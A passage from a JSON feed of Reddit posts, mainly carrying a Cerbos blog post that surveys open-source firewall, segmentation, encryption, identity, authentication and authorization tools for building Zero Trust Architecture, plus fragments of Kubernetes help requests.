support.\"</p>","contentLength":401,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Can I get a broken Kubernetes cluster having various issues that I can detect and troubleshoot.","url":"https://www.reddit.com/r/kubernetes/comments/1mv9j4e/can_i_get_a_broken_kubernetes_cluster_having/","date":1755680291,"author":"/u/r1z4bb451","guid":234732,"unread":true,"content":"<div><p>Would be great if that's free or very cheap service.</p></div>   submitted by   <a href=\"https://www.reddit.com/user/r1z4bb451\"> /u/r1z4bb451 </a>","contentLength":84,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Blog on 'Designing a Zero Trust Architecture: 20 open-source tools to secure every layer","url":"https://www.cerbos.dev/blog/20-open-source-tools-for-zero-trust-architecture","date":1755678437,"author":"/u/PhilipLGriffiths88","guid":234629,"unread":true,"content":"<p>According to studies, most catastrophic failures in a complex system aren’t the result of a single disaster. Instead, they happen when many smaller failures pile up, causing a catastrophe.</p><p>This is called the Swiss Cheese model. In the picture below, you can see a network security system represented in this Swiss Cheese model. Each layer has its vulnerabilities and possibilities for failure, often associated with implicit trust.</p><p>Zero Trust Architecture (ZTA) aims to close many of those vulnerabilities to create blanket coverage, which requires many different tools (slices of Swiss cheese) to properly attain. That’s why we asked our community to share their favorite open-source tools you can use today to make sure your ZTA is complete.</p><p><em>Trust nothing, verify everything.</em></p><p>At first, the statement above may seem extreme, but the rise of non-human identities, autonomous AI agents, and distributed cloud systems makes Swiss cheese of previously hard network boundaries. In this system of soft, moving boundaries, it’s not wise to grant implicit trust to a user based on their network or physical location.</p><p>That’s why ZTA is so rightly paranoid.</p><p>First published by NIST (National Institute of Standards and Technology) in 2020, ZTA is a set of security principles that define a design approach focused on eliminating implicit trust. These principles include:</p><ol><li>Giving the least privileged access to each user and device.</li><li>Segmenting the network to contain threats and reduce lateral movement.</li><li>Always verifying through continuous monitoring, authentication, and authorization.</li><li>Assuming breach as a baseline security posture.</li><li>Enforcing access through centralized, policy-driven decisions.</li></ol><p>These principles lead to systems secured by tools that verify each call or request by users.</p><h2>How to implement Zero Trust Architecture</h2><p>Zero Trust Architecture is about closing the gaps caused by implicit trust —the same gaps shown in the Swiss Cheese model. It’s not a product or a one-time setup, but a practical, ongoing approach where every user, device, and service must continuously verify trust to gain access.</p><p>In practice, this means using strong identity and access controls across every layer of your system and continuously auditing both human and non-human identities. You should be able to answer: What level of access does each identity or service have? Is that level still appropriate? What’s changed?</p><p>Also, Zero Trust systems need to evolve alongside your infrastructure, identity models, and risk landscape. Open-source ZTA tools can support that flexibility:</p><ol><li>The variety of available OSS tools allows you to create a more comprehensive security solution.</li><li>Open-source tools are inherently transparent. You get full visibility into the codebase, giving you the ability to verify the functionality of your tools, and even modify each to suit your requirements. This gives you full ownership and control over your end-to-end stack.</li></ol><p>So to help you build a well-rounded Zero Trust implementation, we’ve organized the most relevant open-source tools into six key categories:</p><h2>Top open-source firewall tools for ZTA</h2><p><em>Never trust incoming traffic is safe. Always verify traffic sources.</em></p><p>The road to Zero Trust starts with a good first line of defence: a firewall that only allows permitted traffic sources and requests into the network. While traditional firewalls weren’t designed with Zero Trust in mind, some open-source solutions offer features that can support certain ZTA principles (traffic segmentation, monitoring, or protocol-level filtering). These tools don’t enforce identity-aware, per-request access decisions on their own, but they can still play a role in a broader Zero Trust strategy when combined with other context-aware systems.</p><p>pfSense is an open-source firewall and router operating system based on FreeBSD. It gives strong control over network traffic. It's a good fit for small to medium-sized organizations, as it works well as a perimeter layer in a broader Zero Trust strategy.</p><ul><li>Stateful Packet Inspection, a functionality that tracks active connections in your network and filters packets accordingly.</li><li>GeoIP blocking for allowing or blocking traffic based on the geographic locations of origin.</li><li>Network access control based on time schedules or connection rules set by network administrators.</li><li>Inbound and outbound Network Address Translation to help control traffic between private and public networks.</li><li>Anti-spoofing prevents attackers from using fake IP addresses to circumvent firewall security measures set.</li></ul><ol><li>Multiple device support allows it to be used on any device running on x86-64 processor architecture.</li><li>Highly configurable firewall rules.</li><li>A large package system that allows the addition of features to its built-in firewall capabilities.</li><li>Threat protection using <a href=\"https://docs.netgate.com/pfsense/en/latest/packages/snort/index.html\">Snort and Suricata</a> Intrusion detection and prevention systems (IDS/IPS).</li></ol><ol><li>pfSense does not evaluate access based on identity or real-time context, which limits its use in dynamic Zero Trust enforcement.</li><li>No x32 processor architecture support from version 2.4.0 onwards.</li><li>Performance is limited to the hardware it runs on, affecting features like IDS/IPS.</li></ol><p>OPNsense is a community-driven fork of pfSense that adds next-generation firewall capabilities through Zenarmor. It has a high frequency of commits (approximately 35–40 per week compared to pfSense’s ~10) that shows an agile and responsive community that actively maintains its codebase. Like pfSense, OPNsense supports Zero Trust-aligned practices like traffic segmentation and perimeter enforcement, but lacks identity- and context-aware access controls required for full ZTA compliance.</p><ul><li>Statefulness for tracking the state of network connections and making filtering decisions based on the states and rules set.</li><li>Grouping IP addresses into aliases simplifies firewall rules management. For country-based filtering, it integrates the GeoLite2 country database.</li><li>Prioritizes traffic for optimal bandwidth allocation.</li><li>Enforces Two-Factor Authentication for accessing the firewall's interface.</li><li>A captive portal for controlling network access by requiring users to enter their credentials on a login page.</li><li>Caching and web filtering capabilities that cache content to improve speed and filter the content based on categories.</li></ul><p>Since it is a fork of pfSense, it shares many of the same advantages and disadvantages. However, some are unique to OPNsense.</p><ol><li>A more user-friendly interface than pfSense.</li></ol><ol><li>OPNsense requires x86-64 hardware, like modern versions of pfSense.</li></ol><p>ModSecurity is a web application firewall backed by OWASP. It specializes in inspecting and filtering HTTP request and response traffic to detect and mitigate threats like SQL injection and cross-site scripting (XSS) and other OWASP Top 10 vulnerabilities. Unlike network firewalls like pfSense or OPNsense, ModSecurity operates purely at the application layer.</p><p>It's particularly crucial for implementing ZTA in web applications as it provides continuous monitoring (which is at the heart of ZTA) along with robust threat detection at the application layer.</p><ul><li>The ability to monitor and log your traffic in real-time to help you identify threats, check for anomalies and troubleshoot issues.</li><li>Can block IP addresses with a known reputation for maliciousness.</li><li>Mitigate threats without modifying the web applications that are under protection.</li></ul><ol><li>Protects web applications from attacks like SQL injection.</li><li>Compatible with multiple web servers namely Apache, Nginx and IIS.</li><li>Can detect malicious traffic and so double as an Intrusion Detection System for alerting you about potential threats.</li></ol><ol><li>Firewall rule processing, if not optimized, can slow down the performance of web servers and consequently applications.</li><li>May require tweaks for normal operations to lower the possibility of false positives blocking safe traffic.</li><li>Only for web applications, not general network traffic.</li></ol><p>It is best suited for companies that want a web firewall with continuous traffic logging and strong application-layer protection. It supports Zero Trust principles but should be paired with identity-aware tools for full coverage.</p><p>GNU General Public License (GPL) license</p><p>IPFire is a Linux operating system that is specifically tuned to serve as a firewall. Some of its features include:</p><ul><li>A stateful nature for tracking active connections.</li><li>Protection against denial-of-service attacks using rate limiting and SYN packet flooding protection.</li><li>Time-based and MAC address-based filtering rules for controlling traffic based on time and specific devices respectively.</li><li>Advanced filtering options with blocklists, MIME type filters, custom allowlists, etc.</li></ul><ol><li>The best OS for firewall functionalities.</li><li>Easier firewall setup due to its smart user interface features like visual aids that help you configure your firewall.</li><li>Helps track connections and debug network activity in real-time.</li></ol><ol><li>Not as widely adopted in enterprise environments compared to ModSecurity, pfSense, and OPNSense.</li><li>Reduced performance when used on weaker hardware platforms due to its many features.</li></ol><p>IPFire is best for companies that would like a dedicated firewall OS, which would include enterprises that are very strict on what they allow inside their network.</p><h2>Top open-source network segregation tools for Zero Trust</h2><p><em>Never trust traffic to stay where it’s allowed. Always verify information traveling between your front and back end.</em></p><p>In a ZTA, even internal traffic is restricted and verified. Often, this is done by micro-segmenting architecture, separating front-end, back-end and database layers so you can ensure traffic only flows where it’s allowed. This limits your exposure if a component is compromised.</p><p>Most cloud providers do offer built-in segregation, but the tools below give you more visibility into your cloud infrastructure.</p><p>Designed for containers and cloud-native applications, Calico offers micro-segmentation by enforcing policies directly at the workload level. It isolates services to ensure secure, policy-driven traffic management and can seamlessly scale across Kubernetes and OpenShift environments.</p><ul><li>Supports namespace-based isolation and identity-based microsegmentation. Namespace-based isolation ensures that workloads in different namespaces remain fully segregated. On the other side, identity-based micro-segmentation allows network policies to be defined based on labels, namespaces or service accounts.</li><li>Ensures traffic segmentation across different network layers and enforcing policies at multiple levels (host, namespace and workload). This helps prevent unauthorized traffic between pods, nodes or services.</li><li>WireGuard encryption provides end-to-end encryption for pod-to-pod communication, preventing unauthorized traffic access between different network segments.</li></ul><ol><li>Highly scalable as it is designed using best practices and industry-accepted standards to work in both small and large clusters.</li><li>Flexible in deployment as it runs on Kubernetes, OpenShift, OpenStack, and bare metal. It also works across on-premises, public and hybrid cloud environments.</li><li>Uses optimized Linux networking algorithms for minimal CPU and resource overhead resulting in overall increased performance.</li><li>Supports rich security policies that support layered security from host networking to application policies.</li></ol><ol><li>Requires a solid understanding of Kubernetes to configure the network policies.</li><li>Since some features are Linux-specific, Windows users may miss out on some features.</li></ol><p>Calico is best network segregation tool for companies who need a way to secure their Kubernetes clusters in a zero-trust and scalable manner.</p><p>Cilium dynamically filters and monitors traffic between services satisfies Zero Trust’s main principles of continuous verification and segregation. It provides secure service isolation at high performance through micro-segmentation. Additionally, it uses Extended Berkeley Packet Filter (eBPF) for advanced, packet-level filtering and visibility.</p><ul><li>Identity-based security i.e., it assigns unique identities to workloads based on labels, enabling network policies that are decoupled from IP addresses. This ensures security policies remain consistent even as workloads are rescheduled or IP addresses change.</li><li>Use of Layer 3 to Layer 7 Network Policies allowing for detailed control over traffic based on various protocols and application-level data.</li><li>Encrypts traffic between workloads to protect against unauthorized interception. This also strengthens network segmentation, ensuring sensitive data remains secure even if a boundary is crossed.</li></ul><ol><li>Guaranteed high performance due to the use of eBPF. This allows Cilium to perform network operations with minimal overhead.</li><li>Cilium's use of eBPF also provides detailed visibility into network traffic and application behaviour, assisting in monitoring and troubleshooting efforts.</li><li>Scales well with large Kubernetes deployments since it's built for cloud-native environments.</li></ol><ol><li>Reliance on eBPF requires a compatible Linux kernel version, which may cause issues in certain environments arising from incompatible Kernel versions.</li><li>Using Cilium may present a steep learning curve for teams unfamiliar with eBPF or its networking model.</li><li>Compatibility with other orchestration platforms other than Kubernetes may vary, requiring additional configuration to use it.</li></ol><p>Cilium is best for companies that want to secure their Kubernetes clusters in a zero-trust and scalable manner and are using a compatible Linux kernel version.</p><p>3.3k stars\nApache-2.0 license</p><p>OpenZiti is an open-source platform for embedding Zero Trust into applications at the network layer. Instead of securing networks based on IP addresses, OpenZiti makes identity the foundation of connectivity. Every connection is explicitly authenticated and authorized before it happens, eliminating the need for exposed IPs, VPNs, inbound ports, or traditional perimeter controls.</p><ul><li>Embeddable SDKs (Go, C, JVM, .NET, Swift, Python, etc.) and lightweight tunnelers to bring identity-first networking to any app or workload.</li><li>Outbound-only overlay mesh that handles routing, load balancing, and service discovery with dynamic, policy-based path selection.</li><li>Microsegmentation by design. Access is enforced per identity and per service, not per subnet or static IP.</li><li>Compatible across IT, OT, IoT, and edge environments, with support for multi-cloud, multi-cluster, and on-prem deployments.</li></ul><ul><li>Identity-first with encryption and authN/Z baked into every flow—policies bound to identities and services, not IPs.</li><li>Flexible adoption path with embedding SDKs for full hardening or the ability to use tunnelers/sidecars when you can’t touch code.</li><li>Fit for dynamic environments (e.g., K8s, multi-cluster) due to overlay abstraction and policy-driven routing.</li></ul><ul><li>Steeper learning curve and setup complexity if not using the managed version from NetFoundry.</li><li>Smaller ecosystem &amp; community than Kubernetes-centric tools like Cilium or Calico.</li></ul><p>OpenZiti is best for engineering teams that need to secure traffic across heterogeneous environments (cloud, on-prem, edge, across IT, OT, and IoT) and want Zero Trust baked into the fabric.</p><p>Flannel is a <a href=\"https://github.com/containernetworking/cni?tab=readme-ov-file#cni---the-container-network-interface\">Container Network Interface</a>, tool just like Calico and Cilium, focused on smaller loads. It creates a layer 3 IPv4 network between nodes in a cluster, ensuring that each pod receives a unique, routable IP address within the cluster. Unlike Calico and Cilium, Flannel only helps you control how traffic moves in your segregated network and not the network as a whole since it does not support network policies.</p><ul><li>Overlay Networks that abstract container traffic, ensuring that an individual node's traffic remains isolated from the rest, supporting effective network segregation.</li><li>Support for various methods of packet transmission, giving administrators the flexibility to choose the most appropriate mechanism to meet their segregation requirements.</li></ul><ol><li>Relatively simple to set up and easy to use.</li><li>Flannel's compatibility with various network backend technologies allows it to be used for diverse network environments and infrastructure needs without too many modifications.</li></ol><ol><li>Does not natively support Kubernetes Network Policies, which are crucial for defining and enforcing rules about how pods communicate with each other. So it requires additional tools, such as Calico, to implement network policies for complete segregation.</li><li>Relatively lower performance compared to Calico or Cilium.</li></ol><p>Flannel is a good fit for startups and smaller teams that need a simple, reliable way to connect workloads inside Kubernetes clusters, without the complexity of full network policy enforcement.</p><p>While OVS doesn’t directly enforce Zero Trust policies, it does increase the capabilities of Zero Trust-aligned tools and network policies. When properly configured, it helps control and isolate traffic flow in combination with those tools.</p><ul><li>Support for the standard <a href=\"https://en.wikipedia.org/wiki/IEEE_802.1Q\">802.1Q</a> VLAN model. This allows for the creation of trunk and access ports, which enable the segmentation of network traffic into isolated broadcast domains.</li><li>Tunnelling protocols, like GRE and VXLAN, that facilitate the creation of overlay networks. These networks aid the separation of network traffic across different physical infrastructures, supporting multi-tenant environments and complex network topologies.</li><li>Allows administrators to define Access Control Lists (ACL), which can be used to permit or deny traffic based on specified criteria.</li></ul><ol><li>Designed for programmatic extension and control, allowing for dynamic network configurations and automation.</li><li>A comprehensive feature set that gives it flexibility to meet a wide range of network needs.</li></ol><ol><li>The feature set and programmability increase complexity for those unfamiliar with it.</li><li>May introduce CPU and memory overhead compared to hardware switches, impacting performance.</li></ol><p>OVS is designed for companies that need programmable control over their network traffic so they can harness network management automation features.</p><blockquote><p>NOTE: Network and firewall tools alone are not sufficient for achieving Zero Trust. Without integrating identity-based access controls, they cannot verify users, devices, or workloads before granting access.</p></blockquote><h2>Top Zero Trust open-source encryption tools</h2><p><em>Never trust that your data is safe. Always encrypt data at all points.</em></p><p>In a Zero Trust environment, data should never be left in a state where it’s easily readable. That means encryption solutions must cover both data at rest and data in transit. Access to encrypted data must be tightly governed by identity and access management to ensure every access attempt is properly verified and authorized.</p><p>Of course, everyone uses encryption, but a strong ZTA requires solutions that go beyond basic file encryption.</p><p>Several licences including GPL-3.0 and GPL-2.0</p><p>GnuPG uses symmetric and public key cryptography algorithms to keep data secure. An implementation of the OpenPGP standard, which is designed for encrypting and signing data and communications, GnuPG is widely used to secure email, encrypt files, and verify the authenticity of  software packages.</p><ul><li>A hybrid encryption model (it combines asymmetric encryption for key exchange with symmetric encryption for message encryption) that balances security and performance.</li><li>Cryptographic signatures that help verify messages and files.</li><li>Some experimental implementations of GnuPG support post-quantum cryptographic algorithms. This can help users future-proof security.</li><li>A decentralized Web of Trust model requires users to sign each other’s keys in order to establish authenticity instead of relying on traditional centralized certificate authorities.</li></ul><ol><li>Fully compatible with other OpenPGP-compliant software.</li><li>Designed for encrypting files and emails, making it viable for different security needs.</li><li>There is no reliance on certification authorities as it has a web of trust model for key authenticity.</li><li>Its <a href=\"https://www.gnupg.org/gph/en/manual/x215.html\">Digital Signatures</a> feature ensures that files, emails, and software packages are authentic and untampered.</li></ol><ol><li>Managing, sharing, and revoking GPG keys can be complicated, especially for non-technical users.</li><li>Scaling is difficult as the Web of Trust requires manual verification.</li><li>Lacks forward secrecy, so if a private key is compromised, all previously encrypted messages using that key can be decrypted.</li><li>Does not natively support post-quantum cryptography.</li></ol><p>GnuPG is best suited for internal operations or encrypting files before being sent into network traffic. It is not ideal for real-time encryption because it is designed for file and message encryption.</p><p>VeraCrypt secures data at rest, similar to GnuPG, restricting unauthorized access to sensitive information. It encrypts drives and creates encrypted volumes by creating a virtual disk, moving the target data to the disk, and encrypting the data.</p><ul><li>Support for multiple encryption algorithms, including AES, Serpent, Twofish (or combinations of the three).</li><li>Hides encrypted volumes or operating systems inside unencrypted ones to protect against coercion attacks.</li><li>Derives encryption keys from user passwords (using <a href=\"https://en.wikipedia.org/wiki/PBKDF2\">PBKDF2</a> with SHA-512, SHA-256, or Whirlpool) to protect against brute-force and dictionary attacks.</li></ul><ol><li>Supports multiple algorithms and cascading encryption to increase encryption strength.</li><li>Protects entire disks and partitions, making it suitable for securing sensitive data on lost or stolen devices.</li><li>Prevents forced or accidental disclosure with hidden volumes/OS.</li><li>Works on Windows, macOS, and Linux.</li></ol><ol><li>Lacks a password recovery feature, which means data is permanently lost if a password is lost.</li><li>May be complex for non-technical users, especially setting up encrypted volumes, managing keys and configuring hidden OS features can be challenging.</li></ol><p>VeraCrypt secures is perfect for small- to medium-sized enterprises that require cryptographic software adaptable enough to work in a hybrid work setting.</p><p>Sealed Secrets is a Kubernetes tool developed by Bitnami for secure secret management in DevOps workflows. It's an encryption software that only allows designated Sealed Secrets controllers to decrypt data.</p><ul><li>Regenerates encryption keys periodically to curb key compromisation.</li><li>Uses Kubernetes' RBAC model to control access to decrypted secrets based on Kubernetes roles and namespaces.</li><li>Enables secure storage of secrets in Git repositories while ensuring that only authorized Kubernetes clusters can decrypt them.</li></ul><ol><li>Controlled secret decryption because only the controller in the Kubernetes cluster can decrypt the secrets.</li><li>Works natively within Kubernetes, eliminating the need for external secret managers.</li><li>Secrets can be shared across several clusters, provided they share the same public/private key pair.</li></ol><ol><li>Controller is a single point of failure. If deleted, encrypted secrets become unrecoverable.</li><li>If the private key is compromised, stored secrets could be decrypted by unauthorized users.</li></ol><h2>Top Zero Trust open-source workload identity tools</h2><p><em>Never trust the calling service is who it says it is. Verify its identity.</em></p><p>When you follow Zero Trust security model, you must verify the identity of every workload or machine, not just human users. Any service claiming to be “trusted” could be compromised. Workloads need their own strong, verifiable identities to prevent lateral movement and unauthorized access. If you want to dive deeper into the security risks of machine and workload identities, take a look at our article on addressing <a href=\"https://www.cerbos.dev/blog/securing-non-human-identities-understanding-and-addressing-owasp-top-10-threats\">the OWASP Top 10 workload threats</a>. So, workload IAM tools are designed to solve these challenges by:</p><ul><li>Assigning a unique, cryptographic identity to each process, container, or service.</li><li>Authenticating and authorizing workloads dynamically, without hardcoded secrets.</li><li>Supporting continuous verification across cloud, Kubernetes, VMs, and on-prem systems.</li></ul><p>While most workload IAM tools are closed-source, below are some open-source options you can use to secure your workloads.</p><p>SPIRE (SPIFFE Runtime Environment) is an open-source tool implementing <a href=\"https://github.com/spiffe/spiffe/blob/main/standards/SPIFFE.md\">SPIFFE standards</a> to verify workloads dynamically. This ensures only authenticated and authorized workloads can communicate within a system.</p><ul><li>Assigns unique SPIFFE IDs to workloads, ensuring a secure and verifiable identity.</li><li>Automated workload authentication.</li><li>Several attestation methods, like node and workload attestation, verify machine and process identity, respectively.</li><li>Workload attestation plugins automatically authenticate workloads based on platform-specific parameters, e.g., Kubernetes pods, VM metadata, AWS IAM roles, etc.</li><li>Authenticates workloads using short-lived X.509 certificates which are rotated to minimize credential leaks.</li><li>Allows defining policies for workload identity issuance and access control based on workload attributes.</li></ul><ol><li>Automated rotation of cryptographic identities strengthens its security model.</li><li>Removes the need for hard-coding API keys and passwords.</li><li>Authenticates workloads across Kubernetes, cloud providers and on-prem infrastructure.</li><li>Easily integrates with existing service meshes like Istio and identity providers.</li></ol><ol><li>Requires configuring multiple components (SPIRE server, agents, attestation plugins) before use.</li><li>Requires integration with other tools like Cerbos to enforce access control policies.</li><li>In large deployments, workload attestation and identity rotation can introduce additional computational overhead, especially in large-scale environments.</li></ol><p>SPIRE is perfect for companies who need to issue and manage workload identities for cloud-native microservices.</p><p>Kubernetes service accounts is a built-in feature that provides a mechanism for managing workload identities in a Kubernetes cluster. It assigns each pod an identity that can be securely authenticated with both the Kubernetes API and external services without relying on static credentials.</p><h4>Features of Kubernetes service accounts</h4><ul><li>Automatic pod identity assignment ensures each pod in a Kubernetes cluster inherits a service account which determines its identity and access permissions.</li><li>Uses JWT tokens (or projected service account tokens) to authenticate with the Kubernetes API or external systems.</li><li>Supports automatically rotated, short-lived JWT tokens, reducing the risk of compromised tokens.</li><li>In cloud environments, Kubernetes workloads can use Workload Identity federation to authenticate for a secret-free workload identity workflow.</li></ul><blockquote><p>In this context, federation refers to a method that allows different systems to securely share credentials for their functioning.</p></blockquote><ol><li>Kubernetes Role-Based Access Control allows assigning specific permissions to different service accounts, limiting what workloads can access.</li><li>Automatically rotated tokens reduce the risk arising from compromised credentials.</li><li>Workloads can authenticate without hardcoded credentials when using service account tokens.</li></ol><ol><li>Limited to Kubernetes unless you add additional configurations for other technologies.</li><li>No built-in policy enforcement.</li><li>Older Kubernetes versions issue long-lived tokens that don’t expire making them prone to leakage.</li></ol><p>Kubernetes service accounts work best for tech teams that are fully reliant on Kubernetes for the functioning of their workflows.</p><p>Business Source License 1.1</p><p>Nomad by HashiCorp integrates <a href=\"https://www.hashicorp.com/en/products/vault\">HashiCorp Vault</a> with SPIFFE to create a flexible workload orchestrator that supports secure workload identity management for all types of applications and infrastructure.</p><ul><li>Provides short-lived dynamic secrets from HashiCorp Vault, reducing exposure to compromised secrets.</li><li>Automatically injects secrets into workloads.</li></ul><ol><li>Highly compatible with a variety of applications and environments: containerized or not; monolithic or microservices; cloud or on-premise environments.</li><li>Simpler to deploy and manage compared to Kubernetes.</li><li>Dynamically assigns identities, avoiding hard-coded secrets.</li></ol><ol><li>Requires SPIRE or Vault for full identity management.</li><li>Does not directly enforce access policies unless integrated with other tools.</li><li>Less adoption compared to Kubernetes Service accounts.</li></ol><p>Nomad is the answer for companies that need a lightweight alternative to Kubernetes. Its simpler deployment model makes it easier to use while still offering powerful orchestration features.</p><h2>Top open-source authentication tools for ZTA</h2><p><em>Never trust users are who they say they are. Always verify users’s identities.</em></p><p>Previously, users were authenticated at login, then given a token that verified their identity across services and extended throughout their session.</p><p>In ZTA, that token is not enough. Zero Trust systems require continuous and dynamic authentication, verifying users before accessing the network and throughout their session. This ensures that even if the user changes before a session ends, the new user must be re-authenticated.</p><p>This dynamic authentication system requires tools that go beyond tokens.</p><p>Keycloak is an identity and access management (IAM) solution with many authentication features which allow you to build a system that follows Zero Trust principles.</p><ul><li>Standard form-based login using usernames and passwords.</li><li>Social login and Single Sign-On through OAuth2 and OpenID Connect providers (Google, Facebook, GitHub, etc.).</li><li>Passwordless Authentication via <a href=\"https://en.m.wikipedia.org/wiki/WebAuthn\">WebAuthn</a> for biometric or hardware key-based authentication.</li><li>Allows users to authenticate via Kerberos tickets.</li><li>Authentication events logging.</li></ul><ol><li>Easy code integration with Java, Node.js, PHP, and other platforms via standard protocols.</li><li>Supports multiple authentication flows, including 2FA and passwordless login.</li><li>Web-based admin console and REST APIs for automation.</li></ol><ol><li>Needs a clustered setup for large deployments that require scaling, which adds operational complexity.</li><li>Updates can cause breaking changes if not managed properly.</li></ol><p>GNU Affero General Public License</p><p>Hanko is a passkey-based authentication tool that uses WebAuthn and biometrics, similar to authentication tools from Google and Apple. It includes a backend for authentication, OAuth, SSO, user management, and JWT issuing.</p><ul><li>Decentralized identity for authenticating using personal devices instead of a central password store.</li><li>REST and WebAuthn APIs for easy integration.</li><li>Frontend SDKs for supporting JavaScript and other frameworks.</li></ul><ol><li>It reduces attack surfaces by avoiding credential storage.</li><li>Better user experience because users can authenticate via biometrics or hardware keys.</li><li>There is no single point of failure or attack as there is no centralized storage.</li></ol><ol><li>Legacy systems, such as browsers and hardware, may not support WebAuthn.</li><li>No traditional login support for fallback options.</li><li>Fewer enterprise features like RBAC or federation compared to Keycloak.</li></ol><p>Hanko.io is an open-source alternative to Clerk and Auth0.</p><p>Zitadel is a ready-to-deploy Identity and Access Management platform that offers the best of both worlds with the simplicity of Auth0 and the open-source commitment of Keycloak.</p><ul><li>Developer focused, customizable open-source project.</li><li>Multi-tenancy features that allow managing multiple organizations within a single instance.</li><li>A self-service user portal for managing authentication methods and account settings.</li><li>Social login and Single Sign-On (SSO) features.</li><li>Webhook notifications support.</li></ul><ol><li>Multi-tenancy support with fine-grained control for both simple and complex organization structures.</li><li>Flexible deployment options. Tech teams can choose between Zitadel Cloud for zero-maintenance operations or self-hosting for full infrastructure control.</li><li>Extensive integrations and extensibility through webhooks, actions, and connectors — enabling deep customization without forking or compromising security.</li></ol><ol><li>Limited available integrations at this time.</li><li>Zitadel’s time in the market is less than their competitors which results in fewer available tutorials from third parties.</li></ol><p>It is built for teams and organizations running distributed applications, those with data residency requirements,  or looking to get the most out of an Identity and Access Management platform.</p><p>It is open-sourced under several licenses outlined in the <a href=\"https://github.com/goauthentik/authentik/blob/main/LICENSE\">LICENSE file</a>.</p><p>Authentik is an identity provider commonly used as a lightweight alternative to Keycloak because both operate in a similar manner with similar features.</p><p>Features that differentiate it from Keycloak are:</p><ol><li>More lightweight than Keycloak.</li><li>Supports several authentication options.</li><li>Can act as an authentication gateway.</li></ol><ol><li>May require additional configuration for large-scale deployments.</li><li>Has a relatively small community and ecosystem.</li></ol><p>Authentik is designed for small containerized deployments or for use where a simpler solution for AuthN is required.</p><h2>Top open-source ZTA authorization tools</h2><p><em>Never trust an entity trying to access a resource has sufficient privilege. Always verify every request against your policies.</em></p><p>Once a user is authenticated, they need to be authorized for each aspect of the application they want to access. With Zero Trust model in place, the system needs extremely fine-grained control to authenticate and explicitly verify and authorize every request for access based on the principle of least privilege. It also needs to ensure all access granted is time-bound.</p><p>Cerbos Policy Decision Point is a scalable, open-source authorization layer for implementing fine-grained roles and permissions. <a href=\"https://github.com/cerbos/cerbos\">Cerbos PDP</a><a href=\"https://www.cerbos.dev/features-benefits-and-use-cases/zero-trust-security\">supports</a> Zero Trust Architecture by enforcing least-privilege access at runtime, dynamically evaluating every request based on user attributes (be it human or not), resource context, and real-time conditions, and generating detailed audit logs to provide visibility and traceability for all access decisions.</p><ul><li>Fine-grained RBAC, ABAC, and PBAC support with simple YAML-based policy definition.</li><li>Scoped policies allow users to tailor security requirements for specific applications or use cases.</li><li>Derived roles allow users to adjust permissions in real time based on contextual parameters.</li><li>Built-in policy testing allows developers to write and validate authorization policies before deployment. These tests can also be integrated into</li><li>CI/CD pipelines to prevent unintended security issues in production.</li></ul><ol><li>Fast, real-time authorization decisions optimized for performance-critical systems.</li><li>Clear, developer-friendly policy model (YAML).</li><li>Comprehensive <a href=\"https://www.cerbos.dev/features-benefits-and-use-cases/audit-logs\">audit logging</a> and compliance alignment with HIPAA, PCI DSS, GDPR, ISO 27001.</li><li>Built-in tools for versioning, policy promotion, and proactive validation.</li><li>Seamless scaling across cloud-native, hybrid, and edge environments without complex tuning.</li><li>Highly scalable with enterprise-grade authorization features for Zero Trust enforcement.</li></ol><ol><li>Some features like centralized management are only available in the Cerbos Hub which is a paid feature.</li><li>If not using the managed version by Cerbos Hub, hosting and scaling Cerbos yourself needs additional configuration and maintenance effort.</li></ol><p>Cerbos is suited for almost any environment and application due to its rich features and support.</p><blockquote><p>\nIf Cerbos has been helpful for you, we'd love it if you gave us a ⭐️ on <a href=\"https://github.com/cerbos/cerbos\">GitHub</a>. It means a lot to our dev team and helps the project grow!</p></blockquote><p>Inspired by Google Zanzibar, OpenFGA is a high-performance authorization engine that streamlines application permissions by adding fine-grained authorization. It integrates seamlessly with existing code via various SDKs.</p><ul><li>Fine-grained authorization modeled on Google Zanzibar principles.</li><li>Integrations with various languages and frameworks via SDKs.</li><li>Support for modeling complex relationships between users, roles, and resources.</li></ul><ul><li>Fast and scalable, built for high-throughput environments.</li><li>Strong fit for complex relationship-based access models.</li><li>An active development community and commercial backing (by Auth0/Okta).</li><li>Good documentation and API design make integration straightforward.</li></ul><ul><li>Focused only on relationship-based authorization; less flexible for broader policy types like attribute-based access control (ABAC).</li><li>Requires additional components (e.g., external identity providers, context providers) for full Zero Trust enforcement.</li><li>Still evolving compared to longer-established engines; enterprise-ready features like audit logging and multi-tenancy are maturing but not as extensive as purpose-built policy engines.</li></ul><p>Open Policy Agent is a general-purpose, open-source policy engine that can be used for authorization in Zero Trust architectures. OPA policies are written in Rego, a domain-specific language that allows for complex policy definitions.</p><ul><li>Supports flexible RBAC and ABAC policies via Rego.</li><li>Can enforce policy decisions across Kubernetes, APIs, service meshes, and CI/CD pipelines.</li><li>Deployable as a sidecar, library, or centralized decision service.</li></ul><ul><li>Highly customizable for diverse policy enforcement needs.</li><li>Strong ecosystem integrations with Kubernetes, Envoy, and other cloud-native tools.</li><li>Mature open-source project with CNCF governance.</li></ul><ul><li>Steep learning curve due to Rego’s specialized syntax and operational model.</li><li>Requires significant engineering effort to model and maintain fine-grained access control at scale.</li><li>Performance optimization is manual and requires tuning for high-throughput use cases.</li><li>Lacks built-in features for policy versioning, multi-tenant policy management, and easy auditability without substantial customization.</li></ul><h2>Comparison table of the tools</h2><p>Use the table below as a quick reference tool to see which tool meets your needs.</p><blockquote><p>NOTE: The number of each tools' GitHub stars is accurate as of the time of writing.</p></blockquote><table><thead><tr></tr></thead><tbody><tr></tr><tr></tr><tr></tr><tr></tr><tr></tr><tr><td>Kubernetes Service Accounts</td></tr><tr><td>Business Source License 1.1</td></tr><tr></tr><tr></tr></tbody></table>","contentLength":36942,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mv91p8/blog_on_designing_a_zero_trust_architecture_20/"},{"title":"[Help] KEDA + Celery: Need Immediate Pod Scaling for Each Queued Task (Zero Queue Length Goal)","url":"https://www.reddit.com/r/kubernetes/comments/1mv8qg5/help_keda_celery_need_immediate_pod_scaling_for/","date":1755677228,"author":"/u/shravan94","guid":234425,"unread":true,"content":"<div><p>I have KEDA + Celery setup working, but there's a timing issue with scaling. I need  when tasks are queued - essentially maintaining  at all times by spinning up a new pod for each task that can't be immediately processed.</p><ol><li>: 1 pod running (minReplicaCount=1), queue=0</li><li>: Pod picks it up immediately, queue=0, pods=1 